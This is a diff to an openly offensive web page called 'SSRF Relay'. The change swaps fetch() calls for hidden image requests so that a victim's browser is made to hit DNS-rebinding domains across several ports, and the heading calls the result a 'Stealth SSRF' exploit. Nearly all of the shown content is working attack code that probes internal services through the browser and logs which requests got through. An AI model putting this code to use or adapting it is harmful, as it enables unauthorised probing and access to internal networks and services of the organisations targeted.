@@ -2,7 +2,7 @@
 <html>
 <head><title>SSRF Relay</title></head>
 <body>
-  <h1>Stealth SSRF Exploit</h1>
+  <h1>Stealth SSRF via Image Tags</h1>
   <pre id="log"></pre>
   <script>
     const rebinderDomains = [
@@ -17,11 +17,15 @@
     for (const rebinder of rebinderDomains) {
       for (const port of ports) {
         const url = `http://${rebinder}:${port}${path}`;
-        fetch(url).then(r => r.text()).then(data => {
-          log.innerText += `✅ SSRF Success: ${url}\n`;
-        }).catch(e => {
-          log.innerText += `❌ SSRF Failed: ${url} → ${e.message}\n`;
-        });
+        const img = new Image();
+        img.src = url;
+        img.onload = () => {
+          log.innerText += `✅ SSRF Triggered: ${url}\n`;
+        };
+        img.onerror = () => {
+          log.innerText += `❌ SSRF Blocked: ${url}\n`;
+        };
+        document.body.appendChild(img);
       }
     }
   </script>
